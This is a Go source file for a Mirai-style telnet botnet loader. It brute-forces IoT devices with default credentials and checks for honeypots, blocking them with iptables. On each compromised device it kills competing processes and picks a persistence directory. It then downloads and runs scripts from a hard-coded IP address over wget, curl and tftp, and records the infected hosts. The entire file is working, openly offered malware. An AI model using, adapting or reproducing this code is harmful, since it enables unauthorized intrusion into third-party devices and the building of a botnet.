package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	PROCESSED_TTL    = 10 * time.Hour
	MAX_CONCURRENT   = 100000
	CREDS_PER_TARGET = 20
	READ_TIMEOUT     = 10 * time.Second
)

const MAGIC_PAYLOAD = `for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then if [ -r "$pid/comm" ]; then comm_name="$(cat "$pid/comm")"; if [ -z "$comm_name" ]; then kill -9 "$pid_num"; continue; fi; case "$comm_name" in "ash"|"sh"|"telnetd") continue;; esac; fi; suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num"; fi; fi; done;`

const DOWNLOAD_PAYLOAD_1 = `persist_dir=""; best_score=-1; while read dev mnt fstype opts rest; do case $fstype in ext4) score=10;; ext3) score=9;; ext2) score=8;; jffs2) score=7;; ubifs|yaffs2|yaffs) score=6;; vfat|fat|exfat) score=5;; *) continue;; esac; case $mnt in /data) score=$((score+5));; /etc) score=$((score+5));; /cache) score=$((score+4));; /mnt/mtd) score=$((score+5));; /mnt) score=$((score+3));; esac; if [ -w "$mnt" ] && [ $score -gt $best_score ]; then best_score=$score; persist_dir="$mnt"; fi; done < /proc/mounts;`

const DOWNLOAD_PAYLOAD_2 = `if [ -z "$persist_dir" ]; then persist_dir="/tmp"; fi`

const DOWNLOAD_PAYLOAD_3 = `rm -rf cat.sh; rm -rf /tmp/*;for dir in "$persist_dir" /tmp /var/tmp /dev/shm /data /cache /run /dev; do if [ -w "$dir" ] && cd "$dir"; then wget -U wget http://68.168.218.237/cat.sh || busybox wget http://68.168.218.237/cat.sh || curl http://68.168.218.237/cat.sh -o cat.sh || busybox curl http://68.168.218.237/cat.sh -o cat.sh; if [ -f cat.sh ]; then chmod 777 cat.sh; sh cat.sh Telnet; ./cat.sh Telnet; break; fi; fi; done`

const TFTP_PAYLOAD = `for dir in /tmp /var/tmp /dev/shm /data /cache /run /dev; do if [ -w "$dir" ] && cd "$dir"; then tftp 68.168.218.237 -g -r tftp.sh -l tftp.sh || busybox tftp 68.168.218.237 -g -r tftp.sh -l tftp.sh || tftp -g -r tftp.sh 68.168.218.237 || busybox tftp -g -r tftp.sh 68.168.218.237; if [ -f tftp.sh ]; then chmod 777 tftp.sh; sh tftp.sh Telnet; ./tftp.sh Telnet; break; fi; fi; done`

const EXEC_MSG = "Loaded successfuly"

var (
	payloadMagicBytes     = []byte(MAGIC_PAYLOAD + "\r\n")
	payloadDownload1Bytes = []byte(DOWNLOAD_PAYLOAD_1 + "\r\n")
	payloadDownload2Bytes = []byte(DOWNLOAD_PAYLOAD_2 + "\r\n")
	payloadDownload3Bytes = []byte(DOWNLOAD_PAYLOAD_3 + "\r\n")
	payloadTftpBytes      = []byte(TFTP_PAYLOAD + "\r\n")
)

var (
	realSystems int32
	honeypots   int32
	fails       int32
	closedPorts int32
	tasksActive int32
	totalTasks  int32
	queuedTasks int32
	infected    int32
	startTime   = time.Now()
	processed   sync.Map
	processing  sync.Map
	targetChan  = make(chan string, 2000000)
	wg          sync.WaitGroup
	mu          sync.Mutex
)

var creds = []struct{ user, pass string }{
  {"root", "root"},
  {"admin", "admin"},
  {"root", "oelinux123"},
  {"usr", "www.usr.cn"},
}

func main() {
	var rLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit); err == nil {
		rLimit.Cur = rLimit.Max
		_ = syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	}

	customPort := flag.Int("p", 23, "custom port to use for targets without explicit port (e.g. 127.0.0.1)")
	flag.Parse()
	runtime.GOMAXPROCS(runtime.NumCPU())

	go updateStatus()

	for i := 0; i < MAX_CONCURRENT; i++ {
		wg.Add(1)
		go worker()
	}

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		fullTarget, ok := parseTarget(line, *customPort)
		if !ok {
			continue
		}

		if !addTarget(fullTarget) {
			continue
		}

		atomic.AddInt32(&totalTasks, 1)
		atomic.AddInt32(&queuedTasks, 1)
		targetChan <- fullTarget
	}
	close(targetChan)
	wg.Wait()
	fmt.Printf("\nDone. Total: %d\n", atomic.LoadInt32(&totalTasks))
}

func parseTarget(line string, defaultPort int) (string, bool) {
	line = strings.Replace(line, ",", ":", 1)
	parts := strings.Split(line, ":")
	if len(parts) == 1 {
		ip := strings.TrimSpace(parts[0])
		if !quickIPCheck(ip) {
			return "", false
		}
		return fmt.Sprintf("%s:%d", ip, defaultPort), true
	}
	if len(parts) != 2 {
		return "", false
	}
	ip, portStr := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		return "", false
	}
	if !quickIPCheck(ip) {
		return "", false
	}
	return fmt.Sprintf("%s:%d", ip, port), true
}

func addTarget(fullTarget string) bool {
	if _, loaded := processing.LoadOrStore(fullTarget, true); loaded {
		return false
	}

	if last, ok := processed.Load(fullTarget); ok {
		if time.Since(last.(time.Time)) < PROCESSED_TTL {
			processing.Delete(fullTarget)
			return false
		}
	}

	return true
}

func quickIPCheck(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, p := range parts {
		if num, err := strconv.Atoi(p); err != nil || num < 0 || num > 255 {
			return false
		}
	}
	return true
}

func dialRetry(target string, attempts int) (net.Conn, error) {
	var conn net.Conn
	var err error
	for i := 0; i < attempts; i++ {
		conn, err = net.DialTimeout("tcp", target, 5*time.Second)
		if err == nil {
			return conn, nil
		}
		time.Sleep(1 * time.Second)
	}
	return nil, err
}

func closeRST(conn net.Conn) {
	if conn == nil {
		return
	}
	if tc, ok := conn.(*net.TCPConn); ok {
		_ = tc.SetLinger(0)
	}
	conn.Close()
}

func blockHoneypotIP(rawTarget string) {
	ip := strings.SplitN(rawTarget, ":", 2)[0]
	if !quickIPCheck(ip) {
		return
	}
	rules := [][2]string{
		{"INPUT", "-s"},
		{"OUTPUT", "-d"},
		{"FORWARD", "-s"},
		{"FORWARD", "-d"},
	}
	for _, r := range rules {
		chain, dir := r[0], r[1]
		check := exec.Command("iptables", "-C", chain, dir, ip, "-j", "DROP")
		if err := check.Run(); err == nil {
			continue
		}
		ins := exec.Command("iptables", "-I", chain, "1", dir, ip, "-j", "DROP")
		_ = ins.Run()
	}
}

func worker() {
	defer wg.Done()
	for target := range targetChan {
		atomic.AddInt32(&queuedTasks, -1)
		atomic.AddInt32(&tasksActive, 1)
		bruteTarget(target)
		atomic.AddInt32(&tasksActive, -1)
		processing.Delete(target)
		processed.Store(target, time.Now())
	}
}

func bruteTarget(target string) {
	var realFound, honeypotFound, portClosed, nextIdx int32
	var wg sync.WaitGroup

	for i := 0; i < CREDS_PER_TARGET; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				if atomic.LoadInt32(&realFound) == 1 || atomic.LoadInt32(&portClosed) == 1 {
					return
				}
				idx := atomic.AddInt32(&nextIdx, 1) - 1
				if int(idx) >= len(creds) {
					return
				}
				c := creds[idx]
				tryCredential(target, c.user, c.pass, &realFound, &honeypotFound, &portClosed)
			}
		}()
	}
	wg.Wait()

	if atomic.LoadInt32(&realFound) == 0 && atomic.LoadInt32(&honeypotFound) == 0 && atomic.LoadInt32(&portClosed) == 0 {
		atomic.AddInt32(&fails, 1)
	}
}

func tryCredential(target, user, pass string, realFound, honeypotFound, portClosed *int32) {
	conn, err := dialRetry(target, 3)
	if err != nil {
		if atomic.CompareAndSwapInt32(portClosed, 0, 1) {
			atomic.AddInt32(&closedPorts, 1)
		}
		return
	}

	drainConn(conn, 3*time.Second)

	if _, err := conn.Write([]byte(user + "\r\n")); err != nil {
		closeRST(conn)
		return
	}
	drainConn(conn, 3*time.Second)

	if _, err := conn.Write([]byte(pass + "\r\n")); err != nil {
		closeRST(conn)
		return
	}
	resp := readAllFast(conn, 5*time.Second)

	if strings.Contains(resp, "GNU") {
		if atomic.CompareAndSwapInt32(honeypotFound, 0, 1) {
			atomic.AddInt32(&honeypots, 1)
			mu.Lock()
			fmt.Printf("\nHONEYPOT: %s (%s:%s)\n", target, user, pass)
			mu.Unlock()
			writeToFile("honeypot.txt", fmt.Sprintf("%s:%s:%s", target, user, pass))
			//go blockHoneypotIP(target)
		}
		closeRST(conn)
		return
	}

	if strings.Contains(resp, "$") || strings.Contains(resp, "#") ||
		strings.Contains(resp, "@") || strings.Contains(resp, "~$") || strings.Contains(resp, "~#") {
		if _, err := conn.Write([]byte("linuxshell\r\n")); err != nil {
			closeRST(conn)
			return
		}
		drainConn(conn, 3*time.Second)
		if _, err := conn.Write([]byte("echo SHELL_TEST\r\n")); err != nil {
			closeRST(conn)
			return
		}
		if strings.Contains(readAllFast(conn, 5*time.Second), "SHELL_TEST") {
			if isRealSystemTelnet(conn) {
				if atomic.CompareAndSwapInt32(realFound, 0, 1) {
					atomic.AddInt32(&realSystems, 1)
					mu.Lock()
					fmt.Printf("\nREAL-SYSTEM: %s (%s:%s)\n", target, user, pass)
					mu.Unlock()
					writeToFile("realtelnet.txt", fmt.Sprintf("%s:%s:%s", target, user, pass))
					go sendPayload(conn, target, user, pass)
					return
				}
			} else {
				if atomic.CompareAndSwapInt32(honeypotFound, 0, 1) {
					atomic.AddInt32(&honeypots, 1)
					mu.Lock()
					fmt.Printf("\nHONEYPOT: %s (%s:%s)\n", target, user, pass)
					mu.Unlock()
					writeToFile("honeypot.txt", fmt.Sprintf("%s:%s:%s", target, user, pass))
					go blockHoneypotIP(target)
				}
			}
		}
	}
	closeRST(conn)
}

func drainConn(conn net.Conn, timeout time.Duration) string {
	conn.SetReadDeadline(time.Now().Add(timeout))
	var data []byte
	buf := make([]byte, 2048)
	first := true
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
			if first {
				first = false
				conn.SetReadDeadline(time.Now().Add(1500 * time.Millisecond))
			}
		}
		if err != nil {
			break
		}
	}
	return string(data)
}

func readAllFast(conn net.Conn, timeout time.Duration) string {
	conn.SetReadDeadline(time.Now().Add(timeout))
	var data []byte
	buf := make([]byte, 2048)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
			conn.SetReadDeadline(time.Now().Add(1500 * time.Millisecond))
			s := string(data)
			if strings.Contains(s, "$") || strings.Contains(s, "#") ||
				strings.Contains(s, "~$") || strings.Contains(s, "~#") {
				break
			}
		}
		if err != nil {
			break
		}
	}
	return string(data)
}

func isRealSystemTelnet(conn net.Conn) bool {
	conn.SetDeadline(time.Now().Add(8 * time.Second))

	conn.Write([]byte("busybox TEST\r\n"))
	out := drainConn(conn, 5*time.Second)
	if !strings.Contains(strings.ToLower(out), "applet not found") {
		return false
	}

	conn.Write([]byte("cat /proc\r\n"))
	out = drainConn(conn, 5*time.Second)
	if !strings.Contains(out, "cat:") && !strings.Contains(out, "no such file") && !strings.Contains(out, "is a directory") {
		return false
	}

	conn.Write([]byte("/\r\n"))
	out = drainConn(conn, 5*time.Second)
	low := strings.ToLower(out)
	if !strings.Contains(low, "permission denied") &&
		!strings.Contains(low, "cannot execute") &&
		!strings.Contains(low, "is a directory") &&
		!strings.Contains(low, "not a directory") {
		return false
	}

	conn.Write([]byte("uname -m\r\n"))
	out = drainConn(conn, 5*time.Second)
	if strings.Contains(out, "armv5tejl") || strings.Contains(out, "x86_64") {
		return false
	}

	return true
}

func sendPayload(conn net.Conn, target, user, pass string) {
	defer closeRST(conn)
	conn.SetDeadline(time.Now().Add(300 * time.Second))

	conn.Write(payloadMagicBytes)
	time.Sleep(8 * time.Second)

	conn.Write(payloadDownload1Bytes)
	time.Sleep(5 * time.Second)

	conn.Write(payloadDownload2Bytes)
	time.Sleep(2 * time.Second)

	conn.Write(payloadDownload3Bytes)
	time.Sleep(35 * time.Second)

	conn.Write(payloadTftpBytes)
	time.Sleep(200 * time.Second)

	out := readAllFast(conn, 10*time.Second)
	if strings.Contains(out, EXEC_MSG) {
		atomic.AddInt32(&infected, 1)
		mu.Lock()
		fmt.Printf("\n[!!] INFECTED %s (%s:%s)\n", target, user, pass)
		writeToFile("infected.txt", fmt.Sprintf("%s:%s:%s", target, user, pass))
		mu.Unlock()
	}
}

func updateStatus() {
	for {
		time.Sleep(2 * time.Second)
		active := atomic.LoadInt32(&tasksActive)
		total := atomic.LoadInt32(&totalTasks)
		queued := atomic.LoadInt32(&queuedTasks)
		real := atomic.LoadInt32(&realSystems)
		hp := atomic.LoadInt32(&honeypots)
		f := atomic.LoadInt32(&fails)
		cp := atomic.LoadInt32(&closedPorts)
		inf := atomic.LoadInt32(&infected)

		completed := real + hp + f + cp
		elapsed := time.Since(startTime)
		var rate float64
		if elapsed.Seconds() > 0 {
			rate = float64(completed) / elapsed.Seconds()
		}
		fmt.Printf("\rActive: %d | Queued: %d | Total: %d | Real: %d | Honeypots: %d | Fails: %d | Closed: %d | Infected: %d | Rate: %.1f/s",
			active, queued, total, real, hp, f, cp, inf, rate)
	}
}

func writeToFile(fname, data string) {
	f, err := os.OpenFile(fname, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(data + "\n")
}
